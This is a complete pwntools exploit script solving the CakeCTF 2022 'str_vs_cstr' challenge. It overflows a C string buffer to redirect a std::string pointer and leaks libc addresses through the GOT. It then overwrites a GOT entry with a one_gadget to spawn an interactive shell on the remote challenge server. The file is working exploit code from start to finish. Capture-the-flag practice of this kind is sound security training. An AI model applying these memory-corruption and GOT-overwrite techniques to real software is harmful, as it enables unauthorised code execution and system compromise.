from pwn import *


class Exploit():
    def __init__(self, chal_path, libc_path=None):
        self.chal = ELF(chal_path)
        self.libc = ELF(libc_path) if libc_path else None

        context.arch = self.chal.arch

        if args.REMOTE:
            self.p = remote("pwn1.2022.cakectf.com", 9003)
        else:
            env = {"LD_PRELOAD": libc_path} if libc_path else None
            self.p = process(self.chal.path, env=env)
            context.terminal = ["tmux", "splitw", "-h"]
            cmds = """
                b *main+347
                b *0x401538
                b *_ZN4Test7call_meEv
            """
            gdb.attach(self.p, cmds)

    def set_c_str(self, c_str):
        self.p.sendlineafter(b"choice: ", b"1")
        self.p.sendlineafter(b"c_str: ", c_str)

    def set_str(self, str):
        self.p.sendlineafter(b"choice: ", b"3")
        self.p.sendlineafter(b"str: ", str)

    def get_str(self):
        self.p.sendlineafter(b"choice: ", b"4")
        self.p.recvuntil(b"str: ")
        return self.p.recvline()

    def run(self):
        # Make std::string's length as 8
        self.set_str(b"A" * 8)

        # Leak libc
        self.set_c_str(b"A"*0x20 + p64(self.chal.got["__libc_start_main"])[:-1])    # -1 is for prepending NULL by std::cin <<
        libc___libc_start_main = u64(self.get_str()[:8])
        log.info("[%30s] %18s", "__libc_start_main@libc", hex(libc___libc_start_main))

        self.set_c_str(b"A"*0x20 + p64(self.chal.got["setbuf"])[:-1])    # -1 is for prepending NULL by std::cin <<
        libc_setbuf = u64(self.get_str()[:8])
        log.info("[%30s] %18s", "setbuf@libc", hex(libc_setbuf))

        # libc6_2.31-0ubuntu9.8_amd64
        libc_base = libc___libc_start_main - 0x23f90
        log.info("[%30s] %18s", "libc", hex(libc_base))
        libc_one_gadget = libc_base + 0xe3b01 
        log.info("[%30s] %18s", "one_gadget@libc", hex(libc_one_gadget))

        # GOT Overwrite with one gadget
        self.set_c_str(b"A"*0x20 + p64(self.chal.got["_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev"]))
        self.set_str(p64(libc_one_gadget))
        self.p.sendlineafter(b"choice: ", b"5")

        self.p.interactive()


def main():
    exploit = Exploit("./str_vs_cstr/chall")
    exploit.run()


if __name__ == "__main__":
    main()
